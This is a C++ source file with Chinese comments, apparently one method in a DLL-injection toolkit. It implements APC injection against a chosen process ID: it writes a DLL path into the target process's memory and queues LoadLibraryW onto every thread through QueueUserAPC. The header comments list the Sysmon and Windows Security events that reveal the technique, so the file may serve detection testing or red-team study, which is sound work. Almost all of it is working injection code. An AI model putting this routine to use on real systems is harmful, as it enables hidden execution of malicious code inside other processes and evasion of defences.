// ════════════════════════════════════════════════════════════════
//  方法 3: APC 注入 — 利用异步过程调用队列
//
//  原理：
//    1. 枚举目标进程的所有线程
//    2. 向每个线程的 APC 队列添加 LoadLibraryW 调用
//    3. 线程进入可警告等待状态时自动执行 APC
//    4. 为提高命中率，向所有线程都注入
//
//  检测特征：
//    - Sysmon Event 10: OpenProcess + OpenThread
//    - Security 4656:   THREAD_SET_CONTEXT 权限请求
//    - Sysmon Event 7:  DLL 加载发生在目标线程上下文中
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <tlhelp32.h>

bool Inject_APC(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] APC 注入 → PID=%lu\n", pid);

    // 1. 打开目标进程，写入 DLL 路径
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    LPVOID remotePath = WriteStringToProcess(hProc, dllPath);
    if (!remotePath)
    {
        Print(L"  [!] VirtualAllocEx 失败\n");
        CloseHandle(hProc);
        return false;
    }
    Print(L"  [+] DLL 路径已写入 @ %p\n", remotePath);

    LPVOID pLoadLib = GetLoadLibraryAddr();
    Print(L"  [+] LoadLibraryW @ %p\n", pLoadLib);

    // 2. 枚举目标进程的所有线程
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        Print(L"  [!] CreateToolhelp32Snapshot 失败\n");
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    int injected = 0;
    THREADENTRY32 te{ .dwSize = sizeof(te) };

    if (Thread32First(snap, &te))
    {
        do {
            if (te.th32OwnerProcessID != pid) continue;

            // 打开线程，请求 THREAD_SET_CONTEXT 权限
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (!hThread)
            {
                Print(L"  [!] OpenThread(%lu) 失败: %lu\n", te.th32ThreadID, GetLastError());
                continue;
            }

            // 3. QueueUserAPC：向线程 APC 队列添加 LoadLibraryW 调用
            DWORD result = QueueUserAPC((PAPCFUNC)pLoadLib, hThread, (ULONG_PTR)remotePath);
            if (result)
            {
                Print(L"  [+] APC 已注入线程 TID=%lu\n", te.th32ThreadID);
                injected++;
            }
            else
            {
                Print(L"  [!] QueueUserAPC(TID=%lu) 失败: %lu\n",
                        te.th32ThreadID, GetLastError());
            }

            CloseHandle(hThread);
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);

    if (injected == 0)
    {
        Print(L"  [!] 未能向任何线程注入 APC\n");
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    Print(L"  [✓] APC 已注入 %d 个线程（等待线程进入可警告状态时执行）\n", injected);

    // 注意：不立即释放 remotePath，APC 是异步执行的
    // 实际使用中需要延迟释放或由目标进程自行清理
    CloseHandle(hProc);
    return true;
}
